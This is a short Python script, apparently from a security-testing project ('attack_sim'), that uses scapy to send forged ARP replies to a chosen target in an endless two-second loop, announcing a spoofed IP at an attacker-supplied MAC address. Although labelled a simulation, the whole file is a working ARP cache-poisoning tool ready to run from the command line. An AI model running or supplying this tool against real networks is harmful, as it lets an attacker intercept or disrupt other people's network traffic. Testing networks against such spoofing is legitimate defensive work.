# attack_sim/spoof_test.py
import sys
import time
from scapy.all import ARP, send

def spoof_arp(target_ip, target_mac, spoof_ip, spoof_mac, interface=None):
    """
    Sends a forged ARP response package to simulate an attack.
    """
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=spoof_mac
    )
    print(f"[*] Sending malicious ARP reply to {target_ip}: {spoof_ip} is at {spoof_mac}")
    send(packet, verbose=False, iface=interface)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python spoof_test.py <Target IP> <Target MAC> <Spoof IP> <Attacker MAC> [Interface]")
        sys.exit(1)

    t_ip = sys.argv[1]
    t_mac = sys.argv[2]
    s_ip = sys.argv[3]
    a_mac = sys.argv[4]
    iface = sys.argv[5] if len(sys.argv) > 5 else None

    print("[+] Starting ARP Poisoning Simulation... Press Ctrl+C to stop.")
    try:
        while True:
            spoof_arp(t_ip, t_mac, s_ip, a_mac, interface=iface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Attack Simulation Stopped.")